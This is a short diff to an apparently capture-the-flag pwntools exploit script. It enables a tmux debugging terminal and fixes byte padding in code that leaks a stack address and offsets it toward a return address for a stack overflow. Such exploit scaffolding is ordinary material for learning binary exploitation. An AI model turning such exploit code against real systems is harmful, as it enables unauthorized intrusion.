@@ -3,7 +3,7 @@ from pwn import *
 
 #context.log_level = 'DEBUG'
 context(os='linux', arch='amd64')
-#context.terminal = ["tmux", "splitw", "-h"]
+context.terminal = ["tmux", "splitw", "-h"]
 
 padding_length = 104
 ret_offset = -96
@@ -21,7 +21,7 @@ continue
 log.info('Get Stack Address')
 io.sendlineafter('(y/n): ', 'y')
 stack_address = io.recvline().decode().strip().split()[-1][2:]
-stack_address = bytes.fromhex(stack_address).rjust(8, '\x00')
+stack_address = bytes.fromhex(stack_address).rjust(8, b'\x00')
 stack_address = u64(stack_address, endian='big')
 stack_address += ret_offset
 log.success(f'Leaked stack address: {p64(stack_address)}')
